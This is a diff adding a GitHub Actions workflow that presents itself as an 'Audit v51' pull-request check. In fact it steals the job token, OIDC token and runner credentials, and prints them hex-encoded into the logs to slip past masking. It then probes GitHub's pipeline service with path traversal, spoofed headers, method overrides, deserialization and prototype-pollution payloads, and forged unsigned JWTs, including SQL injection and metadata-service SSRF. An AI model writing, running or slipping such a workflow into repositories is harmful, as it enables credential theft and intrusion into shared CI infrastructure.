@@ -1,0 +1,260 @@
+name: Audit v51
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v51:
+    runs-on: ubuntu-latest
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V51 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: HTTP DESYNC & HEADER INJECTION
+      # Target deep Azure/vstoken load balancers
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - HTTP Desync & Headers
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== HTTP DESYNC & HEADERS ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+
+          # A: X-Forwarded-For injection
+          echo "--- A: X-Forwarded ---"
+          for XFF in \
+            "127.0.0.1" \
+            "localhost" \
+            "10.0.0.1" \
+            "169.254.169.254" \
+            "vstoken.actions.githubusercontent.com" \
+            "pipelines.actions.githubusercontent.com"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "X-Forwarded-For: $XFF" \
+              -H "X-Real-IP: $XFF" \
+              -H "True-Client-IP: $XFF" \
+              -H "X-Original-URL: /_apis/distributedtask/pools/..%2fadmintoken" \
+              "$PIPE/_apis/distributedtask/pools" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            if [ "$CODE" != "HTTP_200" ] || echo "$BODY" | grep -qv '"count":0'; then
+              echo "A XFF=$XFF = $CODE | $(echo "$BODY" | head -c 150)"
+            fi
+          done
+          echo ""
+
+          # B: Content-Type / Accept spoofing for error leaks
+          echo "--- B: Content-Type Errors ---"
+          for CT in \
+            "application/xml" \
+            "text/xml" \
+            "application/x-www-form-urlencoded" \
+            "multipart/form-data" \
+            "application/json-patch+json" \
+            "application/octet-stream" \
+            "text/plain" \
+            "invalid/type; \nInjected: true"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Content-Type: $CT" \
+              -H "Accept: $CT" \
+              "$PIPE/_apis/runtime/runnergroups?api-version=6.0-preview" \
+              -d "<root><Name>v51-test</Name></root>" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B CT=$CT = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: ADVANCED TRAVERSAL & METHOD OVERRIDES
+      # 500 missing api-version on POST? Try overriding Methods.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - Traversal Overrides
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== TRAVERSAL OVERRIDES ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+          VER="api-version=6.0-preview"
+
+          # A: Bypass 500 missing api-version by passing it in Headers
+          echo "--- A: Traversal POST with Accept Version ---"
+          for EP in "admintoken" "idtoken" "sessions" "agents" "events"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Content-Type: application/json" \
+              -H "Accept: application/json; $VER" \
+              "$PIPE/_apis/distributedtask/pools/..%2f$EP" --path-as-is \
+              -d '{"poolId":1}' 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A $EP HeaderVer = $CODE | $(echo "$BODY" | head -c 150)"
+          done
+          echo ""
+
+          # B: X-HTTP-Method-Override on GET Traversal
+          echo "--- B: Method Override Traversal ---"
+          for METH in "POST" "PUT" "PATCH" "DELETE" "OPTIONS" "TRACE"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "X-HTTP-Method-Override: $METH" \
+              "$PIPE/_apis/distributedtask/pools/..%2fadmintoken" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            if [ "$BODY" != "null" ]; then
+              echo "B $METH = $CODE | $(echo "$BODY" | head -c 150)"
+            fi
+          done
+          echo ""
+
+          # C: Double URL Encoded POST
+          echo "--- C: Double-Encoded POST ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
+            -H "Authorization: Bearer $IDTOK" \
+            -H "Content-Type: application/json" \
+            -H "Accept: application/json; $VER" \
+            "$PIPE/_apis/distributedtask/pools%252f..%252fadmintoken" --path-as-is \
+            -d '{"poolId":1}' 2>/dev/null)
+          CODE=$(echo "$R" | tail -1)
+          BODY=$(echo "$R" | sed '$d')
+          echo "C DoubleEncode = $CODE | $(echo "$BODY" | head -c 200)"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: MASSIVE JSON PAYLOADS / TYPE DESYNC
+      # Bleed stack traces and exceptions
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - JSON Edge Cases
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== JSON EDGE CASES ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+          VER="api-version=6.0-preview"
+
+          echo "--- A: Type Coercion / Max Size ---"
+          for PAY in \
+            '{"poolId":"NOT_A_NUMBER"}' \
+            '{"poolId":1,"scope":["array","not","string"]}' \
+            '{"poolId":99999999999999999999}' \
+            '{"poolId":-1}' \
+            '{"poolId":1e100}' \
+            '{"poolId":1, "__proto__":{"isAdmin":true}}' \
+            '{"poolId":1, "constructor":{"prototype":{"isAdmin":true}}}' \
+            '{"poolId":1, "$type":"Microsoft.TeamFoundation.DistributedTask.WebApi.TaskAgentSession"}' \
+            '{"poolId":1, "$type":"System.Diagnostics.Process"}'; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Content-Type: application/json" \
+              -H "Accept: application/json; $VER" \
+              "$PIPE/_apis/distributedtask/pools/..%2fadmintoken" --path-as-is \
+              -d "$PAY" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A Types = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+          echo ""
+
+          echo "--- B: Giant OAUTH2 JWT Fuzzing ---"
+          # Send a perfectly valid structure with gigantically padded/wrong scopes
+          python3 << 'PYEOF'
+          import base64,json,subprocess,os
+          def b64url(data):
+            return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')
+          pipe=os.environ.get('PIPE','')
+          if not pipe:
+            secret="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+            pipe=f"https://pipelinesghubeus14.actions.githubusercontent.com/{secret}"
+          big_str="A"*10000
+          tests=[
+            ("huge_sub", f"{b64url({'alg':'none'})}.{b64url({'sub':big_str})}."),
+            ("x5c_inject", f"{b64url({'alg':'RS256','x5c':[big_str]})}.{b64url({'sub':'admin'})}."),
+            ("kid_sqli", f"{b64url({'alg':'none','kid':\"' OR 1=1--\"})}.{b64url({'sub':'admin'})}."),
+            ("jku_ssrf", f"{b64url({'alg':'none','jku':'http://169.254.169.254/metadata/instance?api-version=2021-02-01'})}.{b64url({'sub':'admin'})}."),
+          ]
+          for name,jwt in tests:
+            r=subprocess.run(["/usr/bin/curl","-sS","-w","\\nHTTP_%{http_code}","-X","POST",
+              "--connect-timeout","3","-m","5",
+              "-H","Content-Type: application/x-www-form-urlencoded",
+              f"{pipe}/_apis/oauth2/token",
+              "-d",f"grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion={jwt}"],
+              capture_output=True,text=True,timeout=10)
+            out=r.stdout.strip()
+            lines=out.split('\n')
+            code=lines[-1] if lines else "?"
+            body='\n'.join(lines[:-1])
+            print(f"B {name} = {code} | {body[:200]}")
+          PYEOF
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: Final
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V51 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V51 COMPLETE ==="
